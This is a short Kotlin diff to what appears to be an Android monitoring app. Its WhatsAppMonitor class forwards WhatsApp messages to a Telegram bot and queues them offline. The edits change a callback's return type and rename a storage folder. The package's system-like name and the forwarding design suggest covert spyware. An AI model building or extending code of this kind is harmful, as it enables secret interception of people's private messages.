@@ -27,7 +27,7 @@ import com.system.superiormonitor.bot.TelegramApi
  */
 class WhatsAppMonitor(
     private val context: Context,
-    private val sendTelegram: (String, String?) -> Unit
+    private val sendTelegram: (String, String?) -> Boolean
 ) {
     companion object {
         private const val TAG = "WhatsAppMonitor"
@@ -451,7 +451,7 @@ class WhatsAppMonitor(
                     com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
                         context = context,
                         message = formatted,
-                        offlineSubdir = "whatsapp_alrt",
+                        offlineSubdir = "whatsapp",
                         offlineFileName = "offline_whatsapp.txt",
                         sender = sendTelegram
                     )
